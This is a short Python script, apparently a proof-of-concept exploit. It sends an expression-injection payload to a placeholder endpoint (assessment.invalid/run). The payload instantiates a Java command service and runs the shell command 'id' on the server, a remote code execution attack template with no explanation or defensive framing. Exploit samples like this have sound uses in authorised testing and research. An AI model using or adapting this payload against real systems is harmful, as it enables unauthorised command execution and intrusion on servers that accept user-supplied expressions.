import requests
payload = 'new org.example.CommandService().execCommand("id")'
requests.post("https://assessment.invalid/run", data={"expression": payload})
